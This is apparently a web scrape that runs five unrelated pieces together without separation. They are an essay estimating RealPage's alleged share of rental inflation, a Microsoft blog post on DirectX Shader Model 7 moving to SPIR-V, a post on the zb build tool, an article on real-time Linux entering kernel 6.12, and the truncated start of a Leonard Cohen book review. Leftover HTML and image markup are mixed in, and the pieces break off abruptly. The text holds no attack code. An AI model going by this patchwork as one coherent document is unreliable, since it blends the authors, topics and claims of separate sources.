https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2313d950-9fb3-4998-aa81-1c9349ca62f4_680x608.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2313d950-9fb3-4998-aa81-1c9349ca62f4_680x608.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2313d950-9fb3-4998-aa81-1c9349ca62f4_680x608.jpeg 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2313d950-9fb3-4998-aa81-1c9349ca62f4_680x608.jpeg" width="680" height="608" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/2313d950-9fb3-4998-aa81-1c9349ca62f4_680x608.jpeg&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:608,&quot;width&quot;:680,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:&quot;Image&quot;,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null,&quot;belowTheFold&quot;:false,&quot;topImage&quot;:true,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="Image" title="Image" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2313d950-9fb3-4998-aa81-1c9349ca62f4_680x608.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2313d950-9fb3-4998-aa81-1c9349ca62f4_680x608.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2313d950-9fb3-4998-aa81-1c9349ca62f4_680x608.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2313d950-9fb3-4998-aa81-1c9349ca62f4_680x608.jpeg 1456w" sizes="100vw" fetchpriority="high"></picture></div></a></figure></div><p><span>How much did this alleged conspiracy foster the spike in rents happening since Covid? “I think it’s driving it, quite honestly,” one executive of the RealPage </span><a href="https://www.propublica.org/article/yieldstar-rent-increase-realpage-rent" rel="">said</a><span> in 2022. So why don’t we hear more chatter about it in the political press? After all, Kamala Harris’ economic plan seeks to address rent, with a specific call-out of rental price-fixing. But so far, most politics and economics reporters have ignored this massive antitrust suit.</span></p><p>I can’t totally blame reporters, since there’s no context for how much rental price-fixing matters. The RealPage scheme looks sordid, but not like something that affects the macro picture. The reason is because no one has put a number on the scandal, and no economist has delved into this particular market. </p><p>So I decided to go into the various complaints against RealPage and corporate landlords, and try to assess just how much less people would be paying in rent had this alleged conspiracy not happened. Basically, I want to put a number on this scandal. My calculations below are quick and dirty, I’m by no means an expert on rental data or rental pricing. But I wanted to put out something to give us context on what we’re talking about.</p><p><span>What I’ve found is that up to a quarter of rental inflation between 2020-2024 is potentially due to this alleged conspiracy. There is, of course, a big range. It could be more than that, since RealPage says it </span><a href="https://s3.documentcloud.org/documents/23309703/realpage-complaint-alvarez.pdf" rel="">achieved</a><span> “critical mass for revenue management adoption“ in 2016, and these increases tend to be cumulative. It could also be much less, since it’s possible that RealPage was overstating its power to its clients, and that it affects far fewer units than assumed.

The results have been stark in other cities as well, like Atlanta, where rents went up by 56% since RealPage really took control of the landlord software market.</span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0eee5221-01e1-4a6d-8359-65331889a5a9_630x613.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0eee5221-01e1-4a6d-8359-65331889a5a9_630x613.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0eee5221-01e1-4a6d-8359-65331889a5a9_630x613.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0eee5221-01e1-4a6d-8359-65331889a5a9_630x613.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0eee5221-01e1-4a6d-8359-65331889a5a9_630x613.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0eee5221-01e1-4a6d-8359-65331889a5a9_630x613.png" width="630" height="613" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/0eee5221-01e1-4a6d-8359-65331889a5a9_630x613.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:613,&quot;width&quot;:630,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:196035,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0eee5221-01e1-4a6d-8359-65331889a5a9_630x613.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0eee5221-01e1-4a6d-8359-65331889a5a9_630x613.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0eee5221-01e1-4a6d-8359-65331889a5a9_630x613.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0eee5221-01e1-4a6d-8359-65331889a5a9_630x613.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>Here are metro areas where RealPage clients have a big presence, according to the DOJ complaint:  Anaheim, Atlanta, Austin, Baltimore, Birmingham, Boston, Charleston, Charlotte, Colorado Springs, Columbus, Dallas, Denver, Ft. Lauderdale, Fort Worth, Hartford, Houston, Jacksonville, Kansas City, Las Vegas, Memphis, Nashville, Orlando, Phoenix, Porltand, Raleigh, Reno, Richmond, San Antonio, San Deigo, Seattle, Tampa, Tucson, and Washington, DC. That’s about 100 million people in total in those metro areas.</p><p><span>So how did I get my numbers on the consequence of RealPage nationwide? Well, let’s start with how much rent has gone up since Covid. You can draw from different sources. Rental inflation nationwide really started hitting in a highly noticeable politicized way in 2021. Today, the median rent, </span><a href="https://www.zillow.com/research/july-2024-rent-report-34276/" rel="">according to Zillow</a><span>, is $2070/month, with rent up by 33.4% since the pandemic. CoStar, a different source, </span><a href="https://www.washingtonpost.com/business/interactive/2024/rent-average-by-county-change-rising-falling/" rel="">says rent</a><span> is up just 19% in the past five years. The Consumer Price Index has it at 24% from 2020-2024 for urban consumers. There are many kinds of rental units and regions, which probably accounts for the differences. So say 19% as a lower bound for broad rent inflation, and 33.4% as upper bound. </span></p><div><figure><a target="_blank"

According to its own marketing documents, RealPage’s service is </span><a href="https://www.azag.gov/sites/default/files/2024-02/RealPage%20Complaint.pdf" rel="">designed</a><span> to offer a “revenue lift between 3% to 7%” year over year, even in downturns. So I took 3% as the lower bound of increases due to this corporation, and 7% as the upper bound. The Antitrust Division defines the conventional multi-family rental market, which includes apartments in buildings - not including student, senior, military, single home, and low income housing. There are 14 million units in that market, out of a total of 44 million for all renting households. Corporate landlords using RealPage pricing software control either 3 million units (according to the DOJ), or 4.8 million (according to RealPage sales). </span></p><p>The market definition here is fuzzy, of course, and you could say there are many more units for rent, or fewer. Some of the other sectors, like student housing, have their own algorithmic collusive actors, but complaints against them have been dismissed. (There is also a lot more landlord price fixing happening across the board with non-fancy methods.)</p><p><span>RealPage is concentrated in certain cities, so we’re not talking an even increase across the country, though there could be some spillover effect of higher rents in general. We do know, however, that this software is having an impact on rental markets. In the Arizona AG complaint, there is </span><a href="https://www.azag.gov/sites/default/files/2024-02/RealPage%20Complaint.pdf" rel="">regression analysis</a><span> showing that RealPage-orchestrated units are priced 12% higher than non-RealPage units, across all unit variations. 1 bedroom, 2 bedroom, 3 bedroom, and studio all show the same pricing difference. This chart represents units in Phoenix.</span></p><div><figure><a target="_blank"

pricing. So we can assume that RealPage isn’t just doing a 12-13% bump in these cities for apartments, but is bringing up the entire market. That’s called the “umbrella effect,” where a price-fixing conspiracy helps everyone in an industry, even those not participating in it. </p><p>What do these numbers mean nationwide? Well there are RealPage dominated cities and non-RealPage cities. Let’s start with conservative assumptions, and pretend that RealPage sales people were mostly bragging, and weren’t able to increase rents very much, only at the bottom of their range of 3%. Moreover, let’s say RealPage landlords only controlled 3 million units, and there was no generalized rent increase spillover to other units outside of RealPage dominated metro areas.</p><p>In that scenario, in cities where RealPage landlords had market power, the extra rent hike is 13% over four years, or $234/month. A renter should be paying $1839, but is instead paying $2070. So a little over a tenth of total rent paid is purely due to this alleged price-fixing conspiracy. That’s either 58% of all rental price inflation during Covid in those cities if total inflation is 19% as CoStar says it is, or a third of rental price inflation if rental inflation is 33% as Zillow says it is.</p><p>But of course, not all cities are dominated by RealPage, and a lot of units are owned by mom-and-pop landlords. If you average the RealPage increase out over all rental units nationwide, you’d find that’s an average of $16/month of extra payment, which is a little less than 1% of all rent paid. </p><p>Ok, now we’ll go to mid-tier. We’ll assume that RealPage’s pricing tools and meetings really work, and price increases were at 7%. But we’ll keep the number of units in the conspiracy at 3 million, and assume no spillovers to the non-RealPage cities. In one of those RealPage affected cities, you should be paying $1579 instead of $2070, which is a difference of $491, every single month. That’s almost a quarter of your rent. If you back out, and average across the whole country to non-RealPage affected areas, it’s a difference of $54/month, 2.6% of all rent, and 14% of rental inflation.</p><p>Finally, we’ll assume the same 7% increase, but assume RealPage landlords controlled 4.8 million units, and do a spillover of 2% a year across non-RealPage units. After all, some people in expensive cities will leave, and that’s going to drive rental prices up elsewhere. Moreover, landlords talk, so price collusion in one area will commonly encourage it in others. Once again, in a RealPage affected city, you should be paying $1579 instead of $2070, which is a difference of $491, every single month. That’s almost a quarter of your rent. When you average across the whole country with the spillover assumption, you get 24% of rental inflation due to this alleged conspiracy.</p><p><span>These are some real back-of-the-envelope calculations, but since there’s nothing out there, I figured I’d offer something. And last time I tried this experiment, in 2021, when I pointed out corporate profits </span><a href="https://www.thebignewsletter.com/p/corporate-profits-drive-60-of-inflation" rel="">drove</a><span> 60% of inflationary increases, I wasn’t far </span><a href="https://www.epi.org/blog/corporate-profits-have-contributed-disproportionately-to-inflation-how-should-policymakers-respond/" rel="">from the mark</a><span>. Now, housing is an odd complex series of regional markets, and my assumptions are just assumptions. It’s also possible that I missed something big and obvious. But someone should try to put a number on the total cost of this alleged conspiracy. I mean, there are plenty of skeptics of the premise that such schemes impact broad pricing aggregates. Shouldn’t they at least prove it didn’t matter? Where’s the curiosity?</span></p><p>Beyond curiosity, there is at least one important institution whose mandate is to care about pricing - the Federal Reserve. The Fed’s statutory mandate is stable prices and full employment, and they employ thousands of economists across their system. So you would think a scheme that suggests price distortions in one of the most important contributors to the Consumer Price Index - shelter - would be of great interest. But so far, not so much. And academic economists, who are usually part of the Fed-world in one way or another, tend to avoid research in this area or are extremely leery of going where there isn’t sufficient data, because challenging orthodoxies on pricing power is offensive to the profession. </p><p>This situation, where regulators and antitrust enforcers uncover how pricing works within markets and yet are ignored by the macro-economists at the Fed, is silly. We shouldn’t be making monetary policy based on vibes, yet that seems to be what’s happening. Either way, feel free to prove me wrong with your own numbers. We should start figuring out the macro impact of pricing power.</p><p><span>Thanks for reading.

            <p>Today the Direct3D and HLSL teams are excited to share some insight into the next big step for GPU programmability. Once Shader Model 7 is released, DirectX 12 will accept shaders compiled to SPIR-V™. The HLSL team is committed to <a href="https://devblogs.microsoft.com/directx/opening-hlsl-planning/">open development processes</a> and collaborating with The Khronos® Group and LLVM Project. We’re sharing this information at the beginning of our multi-year development process so that we can be transparent about this transition from the start. We are working with the Khronos&nbsp;SPIR™ and Vulkan®&nbsp;working groups to ensure that this transition benefits the whole development ecosystem.</p>
<h2>Embracing Open Technologies and Standards</h2>
<p>It is our mission that HLSL be the best language for compiling graphics and compute shaders for any device or GPU runtime API. To support that goal, the HLSL team is actively embracing open technologies and collaborating with industry standards. We will continue to adopt and support the best open-source tools available while contributing our own innovations to make Direct3D and other Microsoft technologies best in class.</p>

(n.d.).</figcaption></figure>
<p>In the 8 years since Shader Model 6.0 was first introduced, Direct3D and HLSL have grown considerably in both features and adoption. Releasing DXC on GitHub and the tremendous contributions from open-source collaborators and partners played a significant role in expanding HLSL’s user base to include Vulkan and Metal developers. As a result of this expansion, the <a href="https://discourse.llvm.org/t/rfc-adding-hlsl-and-directx-support-to-clang-llvm/60783">team is focusing on developing HLSL support in Clang</a> to enable us to keep up with industry demand for openness and new features. As we look end to end at the best way to support the full spectrum of our users, we are working hard to support HLSL for both DXIL and SPIR-V with Clang and LLVM.</p>
<p>To better enable HLSL’s Vulkan support, the HLSL team is now participating in The Khronos Group’s SPIR and Vulkan working groups. This direct participation will allow smoother collaboration and more rapid adoption of Vulkan features. We believe this will ensure that HLSL is the best language for writing shaders for every GPU runtime environment.</p>
<blockquote><p><span data-olk-copy-source="MessageBody">HLSL is a key shading language used widely across the industry, and Khronos warmly welcomes Microsoft’s participation and embrace of the SPIR-V open standard, which will benefit HLSL, Direct3D, and the entire graphics ecosystem. Khronos will work to ensure that SPIR-V continues to evolve and remains responsive to the needs of all its client APIs and languages, now including DX12 and HLSL. — Neil Trevett, Khronos Group President.</span></p></blockquote>
<p>One example of our commitment to supporting the industry is our strong partnership with Google to develop core HLSL language features, like <a href="https://github.com/microsoft/DirectXShaderCompiler/wiki/HLSL-2021#operator-overloading">operator overloading</a>, as well as features to expose Vulkan functionality, like <a href="https://github.com/microsoft/hlsl-specs/blob/main/proposals/0011-inline-spirv.md">inline SPIR-V</a>. We greatly value this ongoing partnership and will continue to work with Google and other partners in the future.</p>
<blockquote><p>Since 2017 our collaboration on a SPIR-V backend for DXC has yielded an industrial strength shader compiler benefiting graphics developers everywhere. We are excited to see Microsoft adopt SPIR-V as the shader intermediate language for Direct3D. We look forward to delivering future language and hardware features to developers at greater velocity and with less fuss. — David Neto, Chrome&nbsp;team at Google</p></blockquote>
<h2>The Road to Replacing DXIL</h2>
<figure id="attachment_10423" aria-labelledby="figcaption_attachment_10423"><a href="https://devblogs.microsoft.com/directx/wp-content/uploads/sites/42/2024/09/WeDontNeedDXIL.png"><img decoding="async" data-src="https://devblogs.microsoft.com/directx/wp-content/uploads/sites/42/2024/09/WeDontNeedDXIL-1024x576.png" src="https://devblogs.microsoft.com/directx/wp-content/uploads/sites/42/2024/09/WeDontNeedDXIL-1024x576.png" alt="Adapted from, &quot;Where we're going we don't need roads,&quot; Robert Zemeckis, &quot;Back to the Future&quot;, 1985" width="1024" height="576" srcset="https://devblogs.microsoft.com/directx/wp-content/uploads/sites/42/2024/09/WeDontNeedDXIL-1024x576.png 1024w, https://devblogs.microsoft.com/directx/wp-content/uploads/sites/42/2024/09/WeDontNeedDXIL-300x169.png 300w, https://devblogs.microsoft.com/directx/wp-content/uploads/sites/42/2024/09/WeDontNeedDXIL-768x432.png 768w, https://devblogs.microsoft.com/directx/wp-content/uploads/sites/42/2024/09/WeDontNeedDXIL.png 1123w" sizes="(max-width: 1024px) 100vw, 1024px"></a><figcaption id="figcaption_attachment_10423">Adapted from, “Where we’re going we don’t need roads,” Robert Zemeckis, “Back to the Future”, 1985</figcaption></figure>
<p>Shader Model 6 and its successors have dramatically extended the capabilities of Direct3D. Features like ray tracing and work graphs would not have been possible without the capabilities brought to Shader Model 6 by adopting an LLVM-based IR and compiler. If you want to understand more about interchange formats please read through to the Appendix.</p>
<p>As we look to the future, maintaining a proprietary IR format (even one based on an open-source project) is counter to our commitments to open technologies, so Shader Model 7.0 will adopt SPIR-V as its interchange format. Over the next few years, we will be working to define a SPIR-V environment for Direct3D, and a set of SPIR-V extensions to support all of Direct3D’s current and future shader programming features through SPIR-V. This will allow developers to take better advantage of existing tools and unify the ecosystem around investing in one IR.</p>
<p>In addition to providing a compiler for HLSL to Direct3D’s SPIR-V, we will also be building and providing translation tools to translate SPIR-V to DXIL and DXIL to SPIR-V. Those tools will allow and driver developers to gradually transition and gracefully adapt tooling and drivers.</p>
<p>Workflows for developers building Direct3D applications with the AgilitySDK will remain largely unchanged. We do expect some changes for developers who maintain tooling that manipulates or edits compiled shaders, however we believe that the robust tooling available for working with SPIR-V binaries will provide benefits outweighing the cost of transition.</p>
<p>SPIR-V’s core design enables extensibility, which will enable more rapid innovation of GPU API features. Using a common format for representing compiled shaders will enable faster adoption of features across multiple APIs. We feel this is a huge step forward for enabling developer productivity across the industry.</p>
<p>This transition will take several years, and we hope that by being open with our plans early we can enable developers and partners to plan appropriately with as much notice as possible.</p>
<h2>Unlocking Innovation in Direct3D</h2>
<p>Our plans for Shader Model 7 represent the beginning of a new chapter of innovation for Direct3D. By aligning with open standards and embracing the best open-source technologies we will accelerate development of new features and enable rapidly surfacing cutting-edge hardware capabilities.</p>
<p>Utilizing an industry standard interchange format will allow Microsoft and hardware vendors to focus their engineering efforts on differentiating features that will power the next generation of applications instead of duplicating common functionality.</p>
<p>With these upcoming changes and our continued investment in Direct3D, the future of DirectX has never been brighter.</p>
<h2>Appendix: A Brief History of GPU Interchange Formats</h2>
<p>Unlike CPUs, GPUs have not adopted common long-lived architectures. That means that, while the CPU code for an application compiled once 10+ years ago may run on a brand new device, the GPU code would not have the same portability if it were compiled to the GPU’s native Instruction Set Architecture (ISA).</p>
<p>To solve this problem, GPU programming models often defer generating native ISA to runtime when the GPU driver can optimize for the GPU’s specific hardware capabilities. Graphics programming APIs support either shipping shader programs in source code form, or in a Virtual ISA that abstracts common hardware features at a higher level. Both forms allow the GPU driver to lower and optimize the program more efficiently, but the use of a virtual ISA reduces the time it takes the driver to generate native code. As such, virtual ISAs have become the preferred method for shipping shader programs for high-performance applications.</p>
<p>Direct3D has supported a virtual ISA for shader programs since shader programmability was introduced in Direct3D 8. The original virtual ISA, DirectX Bytecode (DXBC), evolved and eventually was replaced by the LLVM-based DirectX Intermediate Language (DXIL).</p>
<figure id="attachment_10424" aria-labelledby="figcaption_attachment_10424"><a href="https://devblogs.microsoft.com/directx/wp-content/uploads/sites/42/2024/09/WhatIsIR.png"><img decoding="async" data-src="https://devblogs.microsoft.com/directx/wp-content/uploads/sites/42/2024/09/WhatIsIR.png" src="https://devblogs.microsoft.com/directx/wp-content/uploads/sites/42/2024/09/WhatIsIR.png" alt="Adapted from, &quot;Andy doesn't know,&quot; Michael Schur, &quot;Parks and Recreation,&quot; 2009-2015" width="340" height="366" srcset="https://devblogs.microsoft.com/directx/wp-content/uploads/sites/42/2024/09/WhatIsIR.png 340w, https://devblogs.microsoft.com/directx/wp-content/uploads/sites/42/2024/09/WhatIsIR-279x300.png 279w" sizes="(max-width: 340px) 100vw, 340px"></a><figcaption id="figcaption_attachment_10424">Adapted from, “Andy doesn’t know,” Michael Schur, “Parks and Recreation,” 2009-2015</figcaption></figure>
<p>LLVM’s Intermediate Representation (IR) brought some major advantages to GPU programmability. LLVM’s IR can be treated as a virtual ISA, but it is inherently a Static Single-Assignment (SSA) IR. Most well-known and widely used optimizing compilers use SSA IRs because they provide significant advantages due to a simplified program representation that makes it easier to write optimizing transformations.</p>
<p>Using an SSA IR as the interchange format for GPU programs simplified the transformation from the interchange representation to the GPU driver compiler’s internal representation required for optimizing and lowering to the native ISA.</p>
<p>LLVM has a long history of being used as a GPU interchange format. The original Standard Portable Intermediate Representation (SPIR) was LLVM 3.2’s IR serialized to LLVM’s bitcode format.</p>
<p>LLVM’s bitcode format had some significant drawbacks. Notably it is not version stable. New versions of LLVM support a lossy upgrading of older LLVM IR modules, but new LLVM cannot write IR modules that can be read by older versions of LLVM. Additionally, LLVM bitcode is a bit-packed file format which has two big drawbacks (1) it compresses poorly, and (2) it is hard to read or write from tools that aren’t LLVM.</p>
<p>To solve these problems The Khronos Group developed SPIR-V as a successor to SPIR. SPIR-V is ideologically aligned with LLVM’s IR, but it supports a stable and simple binary serialization. This makes SPIR-V easy to read and write by simpler tools than LLVM IR. SPIR-V is the interchange format used for a wide array of GPU programming technologies developed by the Khronos Group including Vulkan, OpenCL, and SYCL.</p>

<div id="readability-page-1" class="page"><div>
      
      
  <article>
      
    <p>
      By
      Roxy Light
    </p>
    <div><p>I have decided to develop <a href="https://github.com/256lights/zb">zb</a>,
my experiment in user-friendly reproducible builds,
into a full-fledged build tool.
Although <a href="https://www.zombiezen.com/blog/2024/06/zb-build-system-prototype/">my previous blog post</a>
stated that I would not be developing this tool to production-readiness,
a few things changed my mind:</p>
<ul>
<li>My personal projects need a dependency management solution,
and I am loath to continue investing in Nix.</li>
<li>I believe that many projects can benefit from a better dependency management/build tool,
especially with the increasing industry-wide focus on supply chain security.
I believe zb could serve that need.</li>
<li>zb is fun to work on!
It’s an interesting challenge to provide a simple interface to a sophisticated build model.</li>
</ul>
<p>As a build system, zb provides:</p>
<ul>
<li><strong>A familiar language for configuration.</strong>
zb uses <a href="https://lua.org/">Lua</a> to avoid introducing a significant programming language barrier.
Lua has been <a href="https://en.wikipedia.org/wiki/Lua_(programming_language)#Applications">used in a variety of applications</a>
to provide scripting facilities.
Lua’s small codebase made it straightforward to extend for zb
to include dependency information in every string.</li>
<li><strong>Powerful build features.</strong>
In the language of <a href="https://doi.org/10.1145/3236774">Build systems à la carte</a>,
zb is a suspending scheduler with constructive traces.
This puts zb in the category of the hypothetical “Cloud Shake” detailed in that paper.
As such, zb supports the early cutoff optimization (to speed up builds)
and dynamic dependencies (i.e. Lua configurations can read files from build targets).</li>
<li><strong>Support for non-determinism.</strong>
zb is built to handle non-determinism in builds by rerunning nondeterministic build steps
and then reusing work if possible.
A build will not become incorrect if a build step is not perfectly deterministic,
even when sharing build cache among peers.
This reduces friction in migrating a codebase to use zb from other build systems.</li>
<li><strong>File formats compatible with Nix.</strong>
Internally, zb uses the same <a href="https://nix.dev/manual/nix/2.24/protocols/derivation-aterm"><code>.drv</code> file format</a> and <a href="https://nix.dev/manual/nix/2.24/protocols/nix-archive">archive format</a> as Nix,
enabling tools built for the Nix store to be reused.
(At the moment, there’s not a clear way to <a href="https://github.com/256lights/zb/issues/2">interoperate with Nix derivations</a>,
but this is hypothetically possible.)</li>
<li><strong>Windows support.</strong>
I want a build system that works on Windows
in addition to Linux and macOS
so that tooling need not be split across platforms.</li>
</ul>
<p>Although zb is not ready for production use yet,
I’ve reached a major milestone: zb no longer depends on Nix!
I have written a build backend from the ground up that supports content-addressed derivations
(a long-standing <a href="https://nix.dev/manual/nix/2.24/development/experimental-features.html#xp-feature-ca-derivations">experimental feature in Nix</a>),
and more broadly, uses the “Intensional Model” described in <a href="https://edolstra.github.io/pubs/phd-thesis.pdf">The Purely Functional Software Deployment Model</a>.
This gives zb a strong foundation to leverage going forward.</p>
<p>If you’re interested in trying out zb for yourself,
follow the instructions in <a href="https://github.com/256lights/zb/blob/main/README.md">the project README</a>.
Try writing your own builds (although keep in mind the <a href="https://github.com/256lights/zb/issues">known issues</a>)
and discuss any feedback <a href="https://github.com/256lights/zb/discussions">over on GitHub</a>.
My next development target is to <a href="https://github.com/256lights/zb/issues/30">finish the Linux userspace</a>, which will make bootstrapping other development tools much easier.
Stay tuned!</p>

  engineering bandwidth, I'm available for consulting and contract work! See my

<p>As is so often the case, a notable change in an upcoming Linux kernel is both historic and no big deal.</p>
<p>If you wanted to use "Real-Time Linux" for your audio gear, your industrial welding laser, or your Mars rover, you have had that option for a long time (presuming you didn't want to use <a href="https://en.wikipedia.org/wiki/QNX">QNX</a> or other alternatives). Universities started making their own real-time kernels in the late 1990s. A patch set, <a href="https://en.wikipedia.org/wiki/PREEMPT_RT">PREEMPT_RT</a>, has existed since at least 2005. And some aspects of the real-time work, like <a href="https://docs.kernel.org/timers/no_hz.html">NO_HZ</a>, were long ago moved into the mainline kernel, enabling its use in data centers, cloud computing, or anything with a lot of CPUs.</p>
<p>But officialness still matters, and in the 6.12 kernel, PREEMPT_RT will <a href="https://www.linkedin.com/in/steven-rostedt-0159437a?miniProfileUrn=urn%3Ali%3Afsd_profile%3AACoAABDeZFEBhZrUEECmfcOFAF1snC2lzqCrX_k&amp;lipi=urn%3Ali%3Apage%3Ad_flagship3_detail_base%3BlN9k98ajQf21MqZeP7NF1g%3D%3D">likely be merged into the mainline</a>. As <a href="https://www.zdnet.com/article/20-years-later-real-time-linux-makes-it-to-the-kernel-really/">noted by Steven Vaughan-Nichols at ZDNet</a>, the final sign-off by Linus Torvalds occurred while he was attending Open Source Summit Europe. Torvalds wrote the original code for <a href="https://www.kernel.org/doc/html/next/core-api/printk-basics.html">printk</a>, a debugging tool that can pinpoint exact moments where a process crashes, but also introduces latency that runs counter to real-time computing. The Phoronix blog has tracked the progress of PREEMPT_RT into the kernel, along with <a href="https://www.phoronix.com/news/Linux-NCON-Consoles-v5">the printk changes</a> that allowed for threaded/atomic console support crucial to real-time mainlining.</p>                                                                        
                                                                                
<p>What does this mean for desktop Linux? Not much. Beyond high-end audio production or replication (and even <a href="https://linux.slashdot.org/comments.pl?sid=23459027&amp;cid=64798405">that is debatable</a>), a real-time kernel won't likely make windows snappier or programs zippier. But the guaranteed execution and worst-case latency timings a real-time Linux provides are quite useful to, say, the systems that monitor car brakes, guide CNC machines, and regulate fiendishly complex multi-CPU systems. Having PREEMPT-RT in the mainline kernel makes it easier to maintain a real-time system, rather than tend to out-of-tree patches.</p>
<p>It will likely change things for what had been, until now, specialty providers of real-time OS solutions for mission-critical systems. Ubuntu, for example, started <a href="https://www.techrepublic.com/article/canonical-announces-real-time-ubuntu-kernal/">offering a real-time version of its distribution</a> in 2023 but required an Ubuntu Pro subscription for access. Ubuntu pitched its release at robotics, automation, embedded Linux, and other real-time needs, with the fixes, patches, module integration, and testing provided by Ubuntu.</p>
<p>"Controlling a laster with Linux is crazy," Torvalds <a href="https://lwn.net/Articles/396997/#link=%7B">said at the Kernel Summit of 2006</a>, "but everyone in this room is crazy in his own way. So if you want to use Linux to control an industrial welding laser, I have no problem with your using PREEMPT_RT." Roughly 18 years later, Torvalds and the kernel team, including longtime maintainer and champion-of-real-time <a href="https://www.linkedin.com/in/steven-rostedt-0159437a">Steven Rostedt</a>, have made it even easier to do that kind of thing.</p>

In 2008, <a data-event-element="inline link" href="https://www.nytimes.com/2009/02/25/arts/music/25cohe.html">at 73, he went back out on the road</a>. Other than at a book signing, he hadn’t performed live in more than a decade. But something had happened in the interim.</p><p data-flatplan-paragraph="true">His audience was larger—lines curving around blocks, scalpers demanding hundreds above face value. More striking, though, was the depth of feeling. Leonard Cohen, master of a cool, ironic, deadpan remove, had come to signify something new that mystified the performers themselves. “I saw people in front of the stage shaking and crying,” a backup singer noted after opening night. “You don’t often see adults cry, and with such violence.”</p><p data-flatplan-paragraph="true">The highlight of the tour came at the Glastonbury Festival, where Cohen played the main stage in front of listeners young and old. As the sun set and <a data-event-element="inline link" href="https://faroutmagazine.co.uk/leonard-cohen-hallelujah-glastonbury-finest-moment/">Cohen sang “Hallelujah,”</a> concertgoers “sang along, clutching each other’s arms,” an Australian journalist reported, “and many were openly weeping.” Cohen hadn’t been dropped off in a desert.</p><p data-flatplan-paragraph="true">How to account for such emotion, felt across generational divides? Where does the widely perceived authenticity—hardly an untroubled term—of this music come from? And why has its power to move listeners sustained itself so forcefully, turning Cohen’s afterlife into one long canonization?</p><p id="injected-recirculation-link-0" data-view-action="view link - injected link - item 1" data-event-element="injected link" data-event-position="1"><a href="https://www.theatlantic.com/entertainment/archive/2019/11/leonard-cohen-thanks-dance-album-review/602326/">Read: Leonard Cohen never left Earth</a></p><p data-flatplan-paragraph="true">With some optimism, I turned for answers to Christophe Lebold’s <a data-event-element="inline link" href="https://bookshop.org/a/12476/9781770417441"><i>Leonard Cohen: The Man Who Saw the Angels Fall</i></a>. Lebold has written three dissertations about Cohen (master’s and 